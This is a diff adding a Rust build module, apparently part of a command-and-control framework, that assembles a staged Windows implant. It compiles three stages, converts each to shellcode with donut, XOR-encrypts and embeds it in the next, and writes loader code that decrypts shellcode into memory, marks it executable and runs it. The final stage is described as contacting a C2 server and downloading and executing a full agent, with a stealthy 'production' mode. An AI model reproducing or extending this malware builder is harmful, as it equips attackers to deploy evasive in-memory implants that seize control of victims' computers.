@@ -1,0 +1,412 @@
+//! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0 pipeline
+//!
+//! This module implements the iterative build process:
+//! 1. Compile Stage0 → Convert to shellcode (donut) → Encrypt → Embed in JAVELIN source
+//! 2. Compile JAVELIN (with Stage0) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
+//! 3. Compile ESTER (with JAVELIN) → Final executable
+//!
+//! Each stage is encrypted with a unique XOR key for security
+//!
+//! **Key improvement**: Uses donut to convert EXEs to position-independent shellcode
+//! so they can be executed directly in memory without a PE loader.
+
+use crate::dll_encrypt::{generate_random_key, xor_encrypt};
+use std::fs;
+use std::path::{Path, PathBuf};
+use std::process::Command;
+
+/// Configuration for multi-stage build
+pub struct StageConfig {
+    /// C2 server address (IP:PORT)
+    pub server_address: String,
+    /// Production mode (stealthy, no console)
+    pub production: bool,
+    /// Output directory for artifacts
+    pub output_dir: PathBuf,
+}
+
+/// Converts an EXE to position-independent shellcode using donut
+///
+/// This is CRITICAL - EXE files cannot be executed directly via memory transmute.
+/// They need to be converted to shellcode first using donut.
+///
+/// # Arguments
+/// * `exe_path` - Path to the EXE file to convert
+/// * `output_path` - Path where the shellcode will be saved
+///
+/// # Returns
+/// * `Ok(Vec<u8>)` - The shellcode bytes
+/// * `Err(_)` - Conversion failed
+fn convert_exe_to_shellcode(exe_path: &Path, output_path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    // Find donut.exe - check multiple locations
+    let donut_locations = [
+        PathBuf::from("donut_v1.1/donut.exe"),
+        PathBuf::from("../donut_v1.1/donut.exe"),
+        PathBuf::from(r"E:\repos\C2R2-v2.2\donut_v1.1\donut.exe"),
+    ];
+
+    let donut_exe = donut_locations.iter()
+        .find(|p| p.exists())
+        .ok_or("donut.exe not found. Make sure donut_v1.1 folder exists")?;
+
+    println!("    Converting EXE to shellcode with donut...");
+    println!("    Input: {}", exe_path.display());
+    println!("    Output: {}", output_path.display());
+
+    // Run donut to convert EXE to shellcode
+    // -a 2 = amd64 only (our target)
+    // -f 1 = binary format
+    // -x 1 = exit thread (don't kill parent process)
+    let output = Command::new(donut_exe)
+        .args(&[
+            "-i", &exe_path.to_string_lossy(),
+            "-o", &output_path.to_string_lossy(),
+            "-a", "2",   // x64 only
+            "-f", "1",   // binary format
+            "-x", "1",   // exit thread after execution
+            "-e", "3",   // entropy + encryption
+        ])
+        .output()?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        return Err(format!(
+            "donut conversion failed:\nstdout: {}\nstderr: {}",
+            stdout, stderr
+        ).into());
+    }
+
+    // Read the generated shellcode
+    let shellcode = fs::read(output_path)?;
+    println!("    Shellcode generated: {} bytes", shellcode.len());
+
+    Ok(shellcode)
+}
+
+/// Builds the complete multi-stage system
+pub fn build_staged_system(config: StageConfig) -> Result<PathBuf, Box<dyn std::error::Error>> {
+    println!("╔════════════════════════════════════════╗");
+    println!("║   Multi-Stage Builder (ESTER→JAVELIN→Stage0)   ║");
+    println!("╚════════════════════════════════════════╝");
+    println!();
+
+    // Ensure output directory exists
+    fs::create_dir_all(&config.output_dir)?;
+
+    // Phase 1: Build Stage0
+    println!("[1/3] Building Stage0 (Bootstrap Payload)...");
+    let stage0_binary = build_stage0(&config)?;
+    println!("Stage0 compiled: {} bytes", stage0_binary.len());
+
+    // Phase 2: Build JAVELIN with embedded Stage0
+    println!("\n[2/3] Building JAVELIN with embedded Stage0...");
+    let stage0_key = generate_random_key(32);
+    let javelin_binary = build_javelin_with_stage0(&config, &stage0_binary, &stage0_key)?;
+    println!("JAVELIN compiled: {} bytes", javelin_binary.len());
+
+    // Phase 3: Build ESTER with embedded JAVELIN
+    println!("\n[3/3] Building ESTER with embedded JAVELIN...");
+    let javelin_key = generate_random_key(32);
+    let ester_path = build_ester_with_javelin(&config, &javelin_binary, &javelin_key)?;
+    println!("ESTER compiled: {}", ester_path.display());
+
+    println!("\n Multi-stage system built successfully!");
+    println!("\nExecution flow:");
+    println!("   1. ester.exe validates environment");
+    println!("   2. Decrypts and loads JAVELIN in memory");
+    println!("   3. JAVELIN decrypts and loads Stage0 in memory");
+    println!("   4. Stage0 contacts C2 at {}", config.server_address);
+    println!("   5. Downloads and executes full agent");
+
+    Ok(ester_path)
+}
+
+/// Builds Stage0 binary
+fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    // Update Stage0 config with C2 server address
+    update_stage0_config(&config.server_address)?;
+
+    // Determine features
+    let features = if config.production { "production" } else { "dev" };
+
+    // Build Stage0
+    let status = Command::new("cargo")
+        .args(&[
+            "build",
+            "--release",
+            "--target", "x86_64-pc-windows-msvc",
+            "--package", "stage0",
+            "--features", features,
+        ])
+        .status()?;
+
+    if !status.success() {
+        return Err("Failed to build Stage0".into());
+    }
+
+    // Read the compiled binary
+    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/stage0.exe");
+    let binary = fs::read(binary_path)?;
+
+    Ok(binary)
+}
+
+/// Updates Stage0 configuration with C2 server address
+fn update_stage0_config(server: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let config_content = format!(
+        r#"//! Configuration for Stage0
+pub const C2_SERVER: &str = "{}";
+
+pub fn get_c2_server() -> &'static str {{
+    C2_SERVER
+}}
+
+pub struct SessionConfig {{
+    pub timeout: u64,
+    pub max_retries: u32,
+    pub retry_delay: u64,
+}}
+
+impl Default for SessionConfig {{
+    fn default() -> Self {{
+        Self {{
+            timeout: 30,
+            max_retries: 3,
+            retry_delay: 5,
+        }}
+    }}
+}}
+
+#[used]
+#[no_mangle]
+pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\0\0";
+"#,
+        server
+    );
+
+    fs::write("stages/stage0/src/config.rs", config_content)?;
+    Ok(())
+}
+
+/// Builds JAVELIN with embedded encrypted Stage0 (converted to shellcode via donut)
+fn build_javelin_with_stage0(
+    config: &StageConfig,
+    stage0_binary: &[u8],
+    key: &[u8],
+) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    // CRITICAL: Convert Stage0 EXE to shellcode first!
+    // Raw EXE files cannot be executed via memory transmute - they need donut conversion
+    println!("    Converting Stage0 EXE to shellcode...");
+
+    // Write Stage0 EXE to temp file for donut processing
+    let stage0_exe_path = config.output_dir.join("stage0_temp.exe");
+    let stage0_shellcode_path = config.output_dir.join("stage0.bin");
+    fs::write(&stage0_exe_path, stage0_binary)?;
+
+    // Convert to shellcode using donut
+    let stage0_shellcode = convert_exe_to_shellcode(&stage0_exe_path, &stage0_shellcode_path)?;
+
+    // Clean up temp EXE
+    let _ = fs::remove_file(&stage0_exe_path);
+
+    // Encrypt the SHELLCODE (not the raw EXE!)
+    let encrypted_stage0 = xor_encrypt(&stage0_shellcode, key);
+
+    // Update JAVELIN loader with encrypted payload
+    update_javelin_loader(&encrypted_stage0, key)?;
+
+    // Determine features
+    let features = if config.production { "production" } else { "dev" };
+
+    // Build JAVELIN
+    let status = Command::new("cargo")
+        .args(&[
+            "build",
+            "--release",
+            "--target", "x86_64-pc-windows-msvc",
+            "--package", "javelin",
+            "--features", features,
+        ])
+        .status()?;
+
+    if !status.success() {
+        return Err("Failed to build JAVELIN".into());
+    }
+
+    // Read the compiled binary
+    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/javelin.exe");
+    let binary = fs::read(binary_path)?;
+
+    Ok(binary)
+}
+
+/// Updates JAVELIN loader configuration with encrypted Stage0
+fn update_javelin_loader(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    let payload_literal = format_byte_array(encrypted_payload);
+    let key_literal = format_byte_array(key);
+
+    let loader_content = format!(
+        r#"//! Stage 3 loader - Loads and executes Stage0 (the bootstrap payload)
+use crate::crypto::{{decrypt_payload, CryptoAlgorithm}};
+use crate::memory::{{allocate_rw, cleanup_memory, transition_rx}};
+use std::error::Error;
+
+const ENCRYPTED_STAGE0: &[u8] = &{};
+const STAGE0_XOR_KEY: &[u8] = &{};
+
+pub fn load_stage3() -> Result<(), Box<dyn Error>> {{
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Loading Stage 3 (Stage0)...");
+
+    if ENCRYPTED_STAGE0.len() <= 1 {{
+        return Err("No Stage0 payload embedded".into());
+    }}
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Decrypting Stage0 ({{}} bytes)", ENCRYPTED_STAGE0.len());
+
+    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Allocating {{}} bytes as RW", decrypted.len());
+
+    let region = allocate_rw(decrypted.len())?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Copying payload to memory");
+
+    unsafe {{
+        std::ptr::copy_nonoverlapping(
+            decrypted.as_ptr(),
+            region.address(),
+            decrypted.len(),
+        );
+    }}
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Transitioning memory to RX");
+
+    transition_rx(&region)?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Executing Stage0 shellcode");
+
+    unsafe {{
+        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
+        stage0_entry();
+    }}
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Cleaning up memory");
+
+    cleanup_memory(&region);
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Stage0 execution complete");
+
+    Ok(())
+}}
+"#,
+        payload_literal, key_literal
+    );
+
+    fs::write("stages/javelin/src/loader.rs", loader_content)?;
+    Ok(())
+}
+
+/// Builds ESTER with embedded encrypted JAVELIN (converted to shellcode via donut)
+fn build_ester_with_javelin(
+    config: &StageConfig,
+    javelin_binary: &[u8],
+    key: &[u8],
+) -> Result<PathBuf, Box<dyn std::error::Error>> {
+    // CRITICAL: Convert JAVELIN EXE to shellcode first!
+    // Raw EXE files cannot be executed via memory transmute - they need donut conversion
+    println!("    Converting JAVELIN EXE to shellcode...");
+
+    // Write JAVELIN EXE to temp file for donut processing
+    let javelin_exe_path = config.output_dir.join("javelin_temp.exe");
+    let javelin_shellcode_path = config.output_dir.join("javelin.bin");
+    fs::write(&javelin_exe_path, javelin_binary)?;
+
+    // Convert to shellcode using donut
+    let javelin_shellcode = convert_exe_to_shellcode(&javelin_exe_path, &javelin_shellcode_path)?;
+
+    // Clean up temp EXE
+    let _ = fs::remove_file(&javelin_exe_path);
+
+    // Encrypt the SHELLCODE (not the raw EXE!)
+    let encrypted_javelin = xor_encrypt(&javelin_shellcode, key);
+
+    // Update ESTER config with encrypted payload
+    update_ester_config(&encrypted_javelin, key)?;
+
+    // Determine features
+    let features = if config.production { "production" } else { "dev" };
+
+    // Build ESTER
+    let status = Command::new("cargo")
+        .args(&[
+            "build",
+            "--release",
+            "--target", "x86_64-pc-windows-msvc",
+            "--package", "ester",
+            "--features", features,
+        ])
+        .status()?;
+
+    if !status.success() {
+        return Err("Failed to build ESTER".into());
+    }
+
+    // Copy to output directory
+    let source_path = Path::new("target/x86_64-pc-windows-msvc/release/ester.exe");
+    let dest_path = config.output_dir.join("ester.exe");
+    fs::copy(source_path, &dest_path)?;
+
+    Ok(dest_path)
+}
+
+/// Updates ESTER configuration with encrypted JAVELIN
+fn update_ester_config(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    let payload_literal = format_byte_array(encrypted_payload);
+    let key_literal = format_byte_array(key);
+
+    let config_content = format!(
+        r#"//! Configuration for Stage 1 (ESTER)
+pub const ENCRYPTED_JAVELIN: &[u8] = &{};
+pub const JAVELIN_XOR_KEY: &[u8] = &{};
+pub const JAVELIN_DOWNLOAD_URL: &str = "";
+
+#[used]
+#[no_mangle]
+pub static STAGE_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE1_CONFIG_MARKER___\0\0\0\0";
+"#,
+        payload_literal, key_literal
+    );
+
+    fs::write("stages/ester/src/config.rs", config_content)?;
+    Ok(())
+}
+
+/// Formats a byte array as a Rust literal
+fn format_byte_array(bytes: &[u8]) -> String {
+    if bytes.is_empty() {
+        return "[]".to_string();
+    }
+
+    let mut result = String::from("[\n");
+    for chunk in bytes.chunks(16) {
+        result.push_str("    ");
+        for (i, byte) in chunk.iter().enumerate() {
+            if i > 0 {
+                result.push_str(", ");
+            }
+            result.push_str(&format!("0x{:02x}", byte));
+        }
+        result.push_str(",\n");
+    }
+    result.push_str("]");
+    result
+}
